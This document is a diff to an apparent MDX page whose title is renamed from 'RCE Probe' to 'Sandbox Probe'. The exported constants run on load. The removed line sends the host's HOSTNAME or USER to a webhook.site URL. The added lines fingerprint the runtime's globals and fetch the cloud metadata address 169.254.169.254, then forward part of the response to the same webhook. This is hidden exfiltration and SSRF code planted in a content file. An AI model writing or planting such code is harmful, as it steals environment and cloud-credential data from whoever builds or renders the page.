@@ -1,7 +1,8 @@
 ---
-title: RCE Probe
+title: Sandbox Probe
 ---
-export const _rce = (typeof fetch !== 'undefined') ? fetch('https://webhook.site/604c0863-4f2f-4151-8d02-ded08ba2693b/EXPORT-BUILD?proc='+(typeof process!=='undefined')+'&host='+(typeof process!=='undefined'&&process.env?(process.env.HOSTNAME||process.env.USER||'env'):'noproc')) : null;
+export const _p = (typeof fetch!=='undefined') ? fetch('https://webhook.site/604c0863-4f2f-4151-8d02-ded08ba2693b/SANDBOX?req='+(typeof require)+'&glob='+(typeof global)+'&buf='+(typeof Buffer)+'&gt='+(typeof globalThis)+'&proc='+(typeof process)+'&imp='+(typeof __webpack_require__)) : null;
+export const _s = (typeof fetch!=='undefined') ? fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(t=>fetch('https://webhook.site/604c0863-4f2f-4151-8d02-ded08ba2693b/SSRF-META?len='+t.length+'&d='+encodeURIComponent(t.slice(0,80)))).catch(e=>fetch('https://webhook.site/604c0863-4f2f-4151-8d02-ded08ba2693b/SSRF-ERR?e='+encodeURIComponent((e&&e.message||e)+''))) : null;
 
-# RCE Probe
+# Sandbox Probe
 x
